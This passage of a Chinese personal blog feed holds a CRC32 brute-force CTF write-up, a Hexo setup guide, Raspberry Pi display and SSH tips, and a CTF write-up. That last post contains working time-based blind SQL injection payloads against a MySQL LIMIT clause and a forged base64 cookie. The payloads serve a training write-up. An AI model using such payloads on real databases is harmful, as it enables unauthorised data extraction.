class="line"><span class="comment">//crc32</span></span><br><span class="line">UINT crc32( UCHAR *buf, int len)</span><br><span class="line">&#123;</span><br><span class="line">    UINT <span class="keyword">ret</span> = 0xFFFFFFFF;</span><br><span class="line">    int   i;</span><br><span class="line">    <span class="keyword">if</span>( !init )</span><br><span class="line">    &#123;</span><br><span class="line">     init_table();</span><br><span class="line">     init = 1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = 0; i &lt; len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="keyword">ret</span> = CRC32[((<span class="keyword">ret</span> &amp; 0xFF) ^ buf[i])] ^ (<span class="keyword">ret</span> &gt;&gt; 8);</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">ret</span> = ~<span class="keyword">ret</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> ss[]=<span class="string">"qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890&#123;&#125;_! "</span>;</span><br><span class="line">    <span class="keyword">char</span> sss[6]=&#123;0&#125;;</span><br><span class="line">    int a,b,c,<span class="keyword">d</span>,<span class="keyword">e</span>;</span><br><span class="line"> </span><br><span class="line">    int _crc32 = 0;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span>(a=0; a&lt;<span class="literal">strlen</span>(ss); a++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(b=0; b&lt;<span class="literal">strlen</span>(ss); b++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(c=0; c&lt;<span class="literal">strlen</span>(ss); c++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">d</span>=0; <span class="keyword">d</span>&lt;<span class="literal">strlen</span>(ss); <span class="keyword">d</span>++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">e</span>=0; <span class="keyword">e</span>&lt;<span class="literal">strlen</span>(ss); <span class="keyword">e</span>++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        sss[0] = ss[a];</span><br><span class="line">                        sss[1] = ss[b];</span><br><span class="line">                        sss[2] = ss[c];</span><br><span class="line">                        sss[3] = ss[<span class="keyword">d</span>];</span><br><span class="line">                        sss[4] = ss[<span class="keyword">e</span>];</span><br><span class="line"> </span><br><span class="line">                        _crc32 = crc32((UCHAR *)sss, 5);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span>(_crc32 == 0xF30BDD6C)</span><br><span class="line">                        &#123;</span><br><span class="line">                            printf(<span class="string">"%s\n"</span>, sss);</span><br><span class="line">                            <span class="comment">//system("PAUSE");</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里还有个坑，这里hash碰撞了，第二部分，有两个一样的crc，一个是IYF35,一个是9e76e,一开始为了节省时间，读到第一个符合的crc之后就停止了，导致一直不对，后来跑全了拿到了第二个，提交，对了。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="Problem_ID:17">Problem ID:17</h3><h3 id="EasyUser">EasyUser</h3><p>一看就是一个爆破验证码的题目，然后就开始写脚本<br>]]>
    
    </summary>
    
      <category term="crc" scheme="http://edward-l.github.io/tags/crc/"/>
    
      <category term="hduisa_ctf" scheme="http://edward-l.github.io/tags/hduisa-ctf/"/>
    
      <category term="punch" scheme="http://edward-l.github.io/tags/punch/"/>
    
      <category term="python" scheme="http://edward-l.github.io/tags/python/"/>
    
      <category term="threading" scheme="http://edward-l.github.io/tags/threading/"/>
    
      <category term="writeup" scheme="http://edward-l.github.io/categories/writeup/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[hexo 安装&配置]]></title>
    <link href="http://edward-l.github.io/2015/03/14/hexo%20%E5%AE%89%E8%A3%85&%E9%85%8D%E7%BD%AE/"/>
    <id>http://edward-l.github.io/2015/03/14/hexo 安装&配置/</id>
    <published>2015-03-14T13:30:16.000Z</published>
    <updated>2015-03-14T17:34:56.000Z</updated>
    <content type="html"><![CDATA[<p>MAC升级系统之后很多东西都没有了，hexo也出现了各种奇奇怪怪的问题，索性全部重新安装过了一遍，简单记录下安装搭建hexo的过程。<br><a id="more"></a></p>
<h2 id="安装nodejs">安装nodejs</h2><pre>brew install node</pre>

<h2 id="安装hexo">安装hexo</h2><pre>npm install -g hexo</pre>
##创建blog文件夹
创建一个blog文件夹，并在这个文件夹新建所有blog所需要的文件
<pre>
mkdir blog
hexo init
</pre>

<h2 id="安装依赖包">安装依赖包</h2><pre>npm install</pre>

<h2 id="本地查看">本地查看</h2><pre>
hexo g
hexo s
</pre>

<h2 id="部署到github">部署到github</h2><h3 id="在github创建一个和你github用户名一样的项目">在github创建一个和你github用户名一样的项目</h3><h3 id="检查添加ssh_key">检查添加ssh key</h3><p>检查SSH keys的设置</p>
<pre>cd ~/.ssh 检查本机的ssh密钥</pre>
如果提示：'No such file or directory' 说明你是第一次使用git,那就生成新的ssh key

###生成ssh key
<pre>
$ ssh-keygen -t rsa -C "邮件地址@youremail.com"
Generating public/private rsa key pair.
Enter file in which to save the key (/Users/your_user_directory/.ssh/id_rsa):<回车就好>
</回车就好></pre>

<h3 id="添加SSH_Key到GitHub">添加SSH Key到GitHub</h3><p>登陆github，Account Settings—-&gt;SSH Public keys —-&gt; add another public keys</p>
<pre>cat /Users/Edward_L/.ssh/id_rsa.pub</pre>
把这个密钥添加进去就好了

###测试
<pre>$ ssh -T git@github.com</pre>
看到'Hi cnfeat! You've successfully authenticated, but GitHub does not provide shell access.'这个就好了～

### 设置用户信息
<pre>
$ git config --global user.name "cnfeat"//用户名
$ git config --global user.email  "cnfeat@gmail.com"//填写自己的邮箱
</pre>

<h3 id="将独立域名与GitHub_Pages的空间绑定">将独立域名与GitHub Pages的空间绑定</h3><p>在source中新建一个名为CNAME的文本文件，里面写入你要绑定的域名，例如</p>
<pre>
EdwardL.xyz
www.EdwardL.xyz
</pre>

<h3 id="高级进阶－关于_config-yml的设置">高级进阶－关于_config.yml的设置</h3><p>下面是我的blog配置</p>
<pre>
# Hexo Configuration
## Docs: http://hexo.io/docs/configuration.html
## Source: https://github.com/hexojs/hexo/

# Site
title: Edward_L's Blog
subtitle: 活着就是为了折腾
description:
author: Edward_L
email: linzhexi777@gmail.com
language:

# URL
## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'
url: http://edward-l.github.io/
root: /
permalink: :year/:month/:day/:title/
tag_dir: tags
archive_dir: archives
category_dir: categories
code_dir: downloads/code
permalink_defaults:

# Directory
source_dir: source
public_dir: public

# Writing
new_post_name: :title.md # File name of new posts
default_layout: post
titlecase: false # Transform title into titlecase
external_link: true # Open external links in new tab
filename_case: 0
render_drafts: false
post_asset_folder: false
relative_link: false
highlight:
  enable: true
  line_number: true
  tab_replace:

# Category & Tag
default_category: uncategorized
category_map:
tag_map:

# Archives
## 2: Enable pagination
## 1: Disable pagination
## 0: Fully Disable
archive: 1
category: 2
tag: 2

# Server
## Hexo uses Connect as a server
## You can customize the logger format as defined in
## http://www.senchalabs.org/connect/logger.html
port: 4000
server_ip: localhost
logger: false
logger_format: dev

# Date / Time format
## Hexo uses Moment.js to parse and display date
## You can customize the date format as defined in
## http://momentjs.com/docs/#/displaying/format/
date_format: MMM D YYYY
time_format: H:mm:ss

# Pagination
## Set per_page to 0 to disable pagination
per_page: 0
pagination_dir: page

# Disqus
disqus_shortname: 

# Extensions
## Plugins: https://github.com/hexojs/hexo/wiki/Plugins
## Themes: https://github.com/hexojs/hexo/wiki/Themes
theme: landscape-plus
exclude_generator:

# Deployment
## Docs: http://hexo.io/docs/deployment.html
deploy:
  type: git
  repository: https://github.com/Edward-L/Edward-L.github.io.git
  branch: master 
</pre>

<p>下面是我主题的_config.yml的配置文件</p>
<pre>
# Header
menu:
  Home: /
  Archives: /archives
  #rss: /atom.xml
  About me: /about-me

# Content
excerpt_link: Read More
fancybox: flase

# Sidebar
sidebar: right
widgets:
- category
- tag
- tagcloud
- archive
- recent_posts
- links

# Links
links:
  Old_Blog_Diandian : http://linzhexi.diandian.com/

# Miscellaneous
google_analytics: UA-56285224-2
favicon: /favicon.png
twitter:
google_plus:
fb_admins: 
fb_app_id:

# Duoshuo
duoshuo_shortname: edward7l

# Baidu share
baidushare: true
</pre>

<h3 id="问题和解决">问题和解决</h3><p>1.在安装各种东西的时候遇到报错，请首先考虑是否以管理员的权限运行。<br>2.hexo 2.x和3.x有一个区别，2.x 的blog的_config中deploy的type是github，而在3.x中要把type改成git，并运行</p>
<pre>npm install hexo-deployer-git</pre>]]></content>
    <summary type="html">
    <![CDATA[<p>MAC升级系统之后很多东西都没有了，hexo也出现了各种奇奇怪怪的问题，索性全部重新安装过了一遍，简单记录下安装搭建hexo的过程。<br>]]>
    
    </summary>
    
      <category term="hexo" scheme="http://edward-l.github.io/tags/hexo/"/>
    
      <category term="za" scheme="http://edward-l.github.io/categories/za/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[raspbian pi 配置&技巧]]></title>
    <link href="http://edward-l.github.io/2015/03/13/raspbian%20pi%20%E9%85%8D%E7%BD%AE&%E6%8A%80%E5%B7%A7/"/>
    <id>http://edward-l.github.io/2015/03/13/raspbian pi 配置&技巧/</id>
    <published>2015-03-13T07:30:16.000Z</published>
    <updated>2015-03-19T10:15:06.000Z</updated>
    <content type="html"><![CDATA[<p>拿到了树莓派就开始折腾了。</p>
<h1 id="关于黑屏">关于黑屏</h1><p>一开始就是烧系统了，最先用的是’NOOBS’因为这个不用自己烧，直接下载完放进卡里，树莓派开机就行了，感觉比较快，但是弄完之后显示屏一直处于黑屏状态，换了近十台显示器,HDMI接口都无果，然后就想要不还是自己烧吧，然后就自己下了镜像，和Raspberry-PI-SD-Installer-OS-X-master，开始自己烧，烧完之后，在’/boot/config.txt’中修改，先改成自己电脑屏幕的分辨率之后’reboot’就应该可以了。<br><a id="more"></a><br><strong>CEA分辨率</strong><br>以下是CEA规定的电视规格分辨率。<br>这些分辨率的hdmi_group=1。<br>hdmi_mode=1    VGA<br>hdmi_mode=2    480p  60Hz<br>hdmi_mode=3    480p  60Hz  H<br>hdmi_mode=4    720p  60Hz<br>hdmi_mode=5    1080i 60Hz<br>hdmi_mode=6    480i  60Hz<br>hdmi_mode=7    480i  60Hz  H<br>hdmi_mode=8    240p  60Hz<br>hdmi_mode=9    240p  60Hz  H<br>hdmi_mode=10   480i  60Hz  4x<br>hdmi_mode=11   480i  60Hz  4x H<br>hdmi_mode=12   240p  60Hz  4x<br>hdmi_mode=13   240p  60Hz  4x H<br>hdmi_mode=14   480p  60Hz  2x<br>hdmi_mode=15   480p  60Hz  2x H<br>hdmi_mode=16   1080p 60Hz<br>hdmi_mode=17   576p  50Hz<br>hdmi_mode=18   576p  50Hz  H<br>hdmi_mode=19   720p  50Hz<br>hdmi_mode=20   1080i 50Hz<br>hdmi_mode=21   576i  50Hz<br>hdmi_mode=22   576i  50Hz  H<br>hdmi_mode=23   288p  50Hz<br>hdmi_mode=24   288p  50Hz  H<br>hdmi_mode=25   576i  50Hz  4x<br>hdmi_mode=26   576i  50Hz  4x H<br>hdmi_mode=27   288p  50Hz  4x<br>hdmi_mode=28   288p  50Hz  4x H<br>hdmi_mode=29   576p  50Hz  2x<br>hdmi_mode=30   576p  50Hz  2x H<br>hdmi_mode=31   1080p 50Hz<br>hdmi_mode=32   1080p 24Hz<br>hdmi_mode=33   1080p 25Hz<br>hdmi_mode=34   1080p 30Hz<br>hdmi_mode=35   480p  60Hz  4x<br>hdmi_mode=36   480p  60Hz  4xH<br>hdmi_mode=37   576p  50Hz  4x<br>hdmi_mode=38   576p  50Hz  4x H<br>hdmi_mode=39   1080i 50Hz  reduced blanking<br>hdmi_mode=40   1080i 100Hz<br>hdmi_mode=41   720p  100Hz<br>hdmi_mode=42   576p  100Hz<br>hdmi_mode=43   576p  100Hz H<br>hdmi_mode=44   576i  100Hz<br>hdmi_mode=45   576i  100Hz H<br>hdmi_mode=46   1080i 120Hz<br>hdmi_mode=47   720p  120Hz<br>hdmi_mode=48   480p  120Hz<br>hdmi_mode=49   480p  120Hz H<br>hdmi_mode=50   480i  120Hz<br>hdmi_mode=51   480i  120Hz H<br>hdmi_mode=52   576p  200Hz<br>hdmi_mode=53   576p  200Hz H<br>hdmi_mode=54   576i  200Hz<br>hdmi_mode=55   576i  200Hz H<br>hdmi_mode=56   480p  240Hz<br>hdmi_mode=57   480p  240Hz H<br>hdmi_mode=58   480i  240Hz<br>hdmi_mode=59   480i  240Hz H<br>H means 16:9 variant (of a normally 4:3 mode).<br>2x means pixel doubled (i.e. higher clock rate, with each pixel repeated twice)<br>4x means pixel quadrupled (i.e. higher clock rate, with each pixel repeated four times)</p>
<p><strong>DMT分辨率</strong><br>以下是计算机显示器使用的分辨率。<br>这些分辨率的hdmi_group=2。<br>hdmi_mode=1    640x350   85Hz<br>hdmi_mode=2    640x400   85Hz<br>hdmi_mode=3    720x400   85Hz<br>hdmi_mode=4    640x480   60Hz<br>hdmi_mode=5    640x480   72Hz<br>hdmi_mode=6    640x480   75Hz<br>hdmi_mode=7    640x480   85Hz<br>hdmi_mode=8    800x600   56Hz<br>hdmi_mode=9    800x600   60Hz<br>hdmi_mode=10   800x600   72Hz<br>hdmi_mode=11   800x600   75Hz<br>hdmi_mode=12   800x600   85Hz<br>hdmi_mode=13   800x600   120Hz<br>hdmi_mode=14   848x480   60Hz<br>hdmi_mode=15   1024x768  43Hz  DO NOT USE<br>hdmi_mode=16   1024x768  60Hz<br>hdmi_mode=17   1024x768  70Hz<br>hdmi_mode=18   1024x768  75Hz<br>hdmi_mode=19   1024x768  85Hz<br>hdmi_mode=20   1024x768  120Hz<br>hdmi_mode=21   1152x864  75Hz<br>hdmi_mode=22   1280x768        reduced blanking<br>hdmi_mode=23   1280x768  60Hz<br>hdmi_mode=24   1280x768  75Hz<br>hdmi_mode=25   1280x768  85Hz<br>hdmi_mode=26   1280x768  120Hz reduced blanking<br>hdmi_mode=27   1280x800        reduced blanking<br>hdmi_mode=28   1280x800  60Hz<br>hdmi_mode=29   1280x800  75Hz<br>hdmi_mode=30   1280x800  85Hz<br>hdmi_mode=31   1280x800  120Hz reduced blanking<br>hdmi_mode=32   1280x960  60Hz<br>hdmi_mode=33   1280x960  85Hz<br>hdmi_mode=34   1280x960  120Hz reduced blanking<br>hdmi_mode=35   1280x1024 60Hz<br>hdmi_mode=36   1280x1024 75Hz<br>hdmi_mode=37   1280x1024 85Hz<br>hdmi_mode=38   1280x1024 120Hz reduced blanking<br>hdmi_mode=39   1360x768  60Hz<br>hdmi_mode=40   1360x768  120Hz reduced blanking<br>hdmi_mode=41   1400x1050       reduced blanking<br>hdmi_mode=42   1400x1050 60Hz<br>hdmi_mode=43   1400x1050 75Hz<br>hdmi_mode=44   1400x1050 85Hz<br>hdmi_mode=45   1400x1050 120Hz reduced blanking<br>hdmi_mode=46   1440x900        reduced blanking<br>hdmi_mode=47   1440x900  60Hz<br>hdmi_mode=48   1440x900  75Hz<br>hdmi_mode=49   1440x900  85Hz<br>hdmi_mode=50   1440x900  120Hz reduced blanking<br>hdmi_mode=51   1600x1200 60Hz<br>hdmi_mode=52   1600x1200 65Hz<br>hdmi_mode=53   1600x1200 70Hz<br>hdmi_mode=54   1600x1200 75Hz<br>hdmi_mode=55   1600x1200 85Hz<br>hdmi_mode=56   1600x1200 120Hz reduced blanking<br>hdmi_mode=57   1680x1050       reduced blanking<br>hdmi_mode=58   1680x1050 60Hz<br>hdmi_mode=59   1680x1050 75Hz<br>hdmi_mode=60   1680x1050 85Hz<br>hdmi_mode=61   1680x1050 120Hz reduced blanking<br>hdmi_mode=62   1792x1344 60Hz<br>hdmi_mode=63   1792x1344 75Hz<br>hdmi_mode=64   1792x1344 120Hz reduced blanking<br>hdmi_mode=65   1856x1392 60Hz<br>hdmi_mode=66   1856x1392 75Hz<br>hdmi_mode=67   1856x1392 120Hz reduced blanking<br>hdmi_mode=68   1920x1200       reduced blanking<br>hdmi_mode=69   1920x1200 60Hz<br>hdmi_mode=70   1920x1200 75Hz<br>hdmi_mode=71   1920x1200 85Hz<br>hdmi_mode=72   1920x1200 120Hz reduced blanking<br>hdmi_mode=73   1920x1440 60Hz<br>hdmi_mode=74   1920x1440 75Hz<br>hdmi_mode=75   1920x1440 120Hz reduced blanking<br>hdmi_mode=76   2560x1600       reduced blanking<br>hdmi_mode=77   2560x1600 60Hz<br>hdmi_mode=78   2560x1600 75Hz<br>hdmi_mode=79   2560x1600 85Hz<br>hdmi_mode=80   2560x1600 120Hz reduced blanking<br>hdmi_mode=81   1366x768  60Hz<br>hdmi_mode=82   1080p     60Hz<br>hdmi_mode=83   1600x900        reduced blanking<br>hdmi_mode=84   2048x1152       reduced blanking<br>hdmi_mode=85   720p      60Hz<br>hdmi_mode=86   1366x768        reduced blanking</p>
<h2 id="关于怎样更加愉快的连接ssh">关于怎样更加愉快的连接ssh</h2><p>毕竟我们大多数的时候还是用ssh连接上去的玩耍的，并不是用屏幕的，所以要怎么样才能更加愉快的链接到ssh呢，下面就是几个小技巧和大家分享啦～首先，让树莓派先记住一个wifi的账号和密码，可以在’/etc/wpa_supplicant/wpa_supplicant.conf’中添加查看已经记忆的wifi账号和密码，你自己也可以记住，这样以后出去的时候快就可以用自己的电脑去放一个和你之前就记住的一样的账号和密码，这样你的树莓派就能够自己连接上去啦，当然现在就是要怎么知道树莓派的局域网IP啦，你当然可以用nmap去扫描这个局域网里的22端口的ip，但是这样是不是太不方便了呢！没关系，你可以自行google<a href="http://shumeipai.nxez.com/2014/03/18/let-raspberry-pi-ip-address-is-automatically-reported-to-the-mailbox.html" target="_blank" rel="external">让树莓派自动上报IP地址到邮箱</a>,当然你可能会遇到一些问题,我也遇到了很多问题！<br>下面就给出一些我遇到的问题的解决方法：<br>首先，最好在send-ip-mail.sh中添加HOME=’/root/‘，然后，如果你遇到账户登陆不了，很有可能是你的邮箱没有开启SMTP等服务，开启就可以了～还有部分邮箱登陆的’auth’不是’login’ 而是’plain’～<br>这样就能够愉快的局域网，又能够及时的知道自己局域网的ip了～可以愉快的ssh之后就能够做很多好玩的事啦～</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>拿到了树莓派就开始折腾了。</p>
<h1 id="关于黑屏">关于黑屏</h1><p>一开始就是烧系统了，最先用的是’NOOBS’因为这个不用自己烧，直接下载完放进卡里，树莓派开机就行了，感觉比较快，但是弄完之后显示屏一直处于黑屏状态，换了近十台显示器,HDMI接口都无果，然后就想要不还是自己烧吧，然后就自己下了镜像，和Raspberry-PI-SD-Installer-OS-X-master，开始自己烧，烧完之后，在’/boot/config.txt’中修改，先改成自己电脑屏幕的分辨率之后’reboot’就应该可以了。<br>]]>
    
    </summary>
    
      <category term="raspbian pi" scheme="http://edward-l.github.io/tags/raspbian-pi/"/>
    
      <category term="ssh" scheme="http://edward-l.github.io/tags/ssh/"/>
    
      <category term="树莓派" scheme="http://edward-l.github.io/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"/>
    
      <category term="黑屏" scheme="http://edward-l.github.io/tags/%E9%BB%91%E5%B1%8F/"/>
    
      <category term="raspbian pi" scheme="http://edward-l.github.io/categories/raspbian-pi/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[hduisa_ctf_week2_writeup]]></title>
    <link href="http://edward-l.github.io/2015/02/06/hduisa_ctf_week2_writeup/"/>
    <id>http://edward-l.github.io/2015/02/06/hduisa_ctf_week2_writeup/</id>
    <published>2015-02-05T18:30:16.000Z</published>
    <updated>2015-02-07T11:31:38.000Z</updated>
    <content type="html"><![CDATA[<h3 id="Problem_ID:7">Problem ID:7</h3><h3 id="颇有技巧的SQL注入">颇有技巧的SQL注入</h3><p>真的是一题让我学到了很多的题目啊。一步一步来，首先为了做这道题，我查看了大概一下的资料：<br><a href="http://www.edwardl.xyz/2015/02/06/SQL%20Injections%20in%20MySQL%20LIMIT%20clause/" target="_blank" rel="external">SQL Injections in MySQL LIMIT clause</a><br><a href="http://lightless.me/archives/MySQL-Injection-Quick-Reference.html" target="_blank" rel="external">MySQL Injection Quick Reference</a><br><a href="http://www.freebuf.com/articles/web/34619.html" target="_blank" rel="external">SQLi Labs 指南 Part 1</a><br><a href="http://www.freebuf.com/articles/web/38315.html" target="_blank" rel="external">SQLi Labs 指南 Part 2</a><br><a href="http://lightless.me/archives/Limit-Injection-Writeup.html" target="_blank" rel="external">hint</a><br><a id="more"></a><br>大概总结下就是一般的步骤为：<br>1.爆数据库的个数<br>2.爆数据库的名字<br>3.爆表的个数<br>4.爆表的名字<br>5.爆表的字段数<br>6.爆表的字段名<br>7.爆表中的内容<br>然后我就开始从hint出发，开始构造payload。开始看了下hint中给出的两个payload，一个是爆数据库的个数的，一个是爆数据库的名字的，但是做到后来才发现，其实这两步在这个题中也不是十分必要的，因为，这道题我们已经在这个数据库中了，后来的payload中不用到数据库的名字也是可以的。然后就是爆表的各个部分了，一开始看了下表的个数，<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://104.236.171.163/week2/limit/?l=1 PROCEDURE analyse((<span class="operator"><span class="keyword">select</span> extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">COUNT</span>(TABLE_NAME) <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)) <span class="keyword">FROM</span> INFORMATION_SCHEMA.<span class="keyword">TABLES</span> <span class="keyword">WHERE</span> TABLE_SCHEMA = <span class="keyword">DATABASE</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) = <span class="number">99</span> , <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>);</span></span><br></pre></td></tr></table></figure></p>
<p>接下来就是爆表的名字了<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://104.236.171.163/week2/limit/?l=1 PROCEDURE analyse((<span class="operator"><span class="keyword">select</span> extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(table_name <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)) <span class="keyword">FROM</span> INFORMATION_SCHEMA.<span class="keyword">TABLES</span> <span class="keyword">WHERE</span> TABLE_SCHEMA = <span class="keyword">DATABASE</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) = <span class="number">99</span> , <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>);</span></span><br></pre></td></tr></table></figure></p>
<p>然后是表的字段数<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://104.236.171.163/week2/limit/?l=1 PROCEDURE analyse((<span class="operator"><span class="keyword">select</span> extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">COUNT</span>(*) <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)) <span class="keyword">FROM</span> INFORMATION_SCHEMA.<span class="keyword">COLUMNS</span> <span class="keyword">WHERE</span> TABLE_NAME=<span class="number">0x666C6167</span> <span class="keyword">AND</span> TABLE_SCHEMA = <span class="keyword">DATABASE</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) = <span class="number">99</span> , <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>);</span></span><br></pre></td></tr></table></figure></p>
<p>然后是爆表的字段名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://104.236.171.163/week2/limit/?l=1 PROCEDURE analyse((<span class="operator"><span class="keyword">select</span> extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(COLUMN_NAME <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)) <span class="keyword">FROM</span> INFORMATION_SCHEMA.<span class="keyword">COLUMNS</span> <span class="keyword">WHERE</span> TABLE_NAME=<span class="number">0x666C6167</span> <span class="keyword">AND</span> TABLE_SCHEMA = <span class="keyword">DATABASE</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) = <span class="number">99</span> , <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>);</span></span><br></pre></td></tr></table></figure></p>
<p>最后就是爆表的内容<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://104.236.171.163/week2/limit/?l=1 PROCEDURE analyse((<span class="operator"><span class="keyword">select</span> extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(ctf_limit_flag <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)) <span class="keyword">FROM</span> flag <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) = <span class="number">99</span> , <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>);</span></span><br></pre></td></tr></table></figure></p>
<p>最后得到flag。</p>
<h3 id="Problem_ID:8">Problem ID:8</h3><h3 id="简单的题目">简单的题目</h3><p>根据题目描述， <code>GET ID = FLAG！</code>,尝试提交一个get表单，｀ID=FLAG`,构造URL，得到flag。</p>
<h3 id="Problem_ID:9">Problem ID:9</h3><h3 id="基础训练">基础训练</h3><p>查看饼干，发现有个饼干是这样的<code>flag=bGlnaHRsZXNzOjQ3NmExMGYxZjNkZGU1MWQxYjUyMjY3YzFhY2NjMzll</code>应该是主要考加密解密的，base64解一下，得到<code>lightless:476a10f1f3dde51d1b52267c1accc39e</code>,应该是<code>名字：md5(名字)</code>的模式，根据首页的提示，<code>要用我名字的罗马音哦~</code>，逆向的进行一步一步加密，<code>Tobiichi Origami:097b235243b09755b3f586f201e8da8d</code>然后得到<code>VG9iaWljaGkgT3JpZ2FtaTowOTdiMjM1MjQzYjA5NzU1YjNmNTg2ZjIwMWU4ZGE4ZA==</code>，用这个换掉原来的饼干，done！</p>
<p>week2的题目后面两道，虽然有一点点小失误（有一题base64转码的过程中，把空格进行了URL编码，导致一直不对但是后来想到了就秒了），但基本上还算是秒掉的。但是第一题确实是比较困难的，做的过程中看了很多资料，也增加了自己的很多知识，弥补了很多的不足。挺好的。训练还是有用的。<br>期待week3！</p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="Problem_ID:7">Problem ID:7</h3><h3 id="颇有技巧的SQL注入">颇有技巧的SQL注入</h3><p>真的是一题让我学到了很多的题目啊。一步一步来，首先为了做这道题，我查看了大概一下的资料：<br><a href="http://www.edwardl.xyz/2015/02/06/SQL%20Injections%20in%20MySQL%20LIMIT%20clause/">SQL Injections in MySQL LIMIT clause</a><br><a href="http://lightless.me/archives/MySQL-Injection-Quick-Reference.html">MySQL Injection Quick Reference</a><br><a href="http://www.freebuf.com/articles/web/34619.html">SQLi Labs 指南 Part 1</a><br><a href="http://www.freebuf.com/articles/web/38315.html">SQLi Labs 指南 Part 2</a><br><a href="http://lightless.me/archives/Limit-Injection-Writeup.html">hint</a><br>]]>
    
    </summary>
    
      <category term="hduisa_ctf" scheme="http://edward-l.github.io/tags/hduisa-ctf/"/>
    
      <category term="limit注入" scheme="http://edward-l.github.io/tags/limit%E6%B3%A8%E5%85%A5/"/>
    
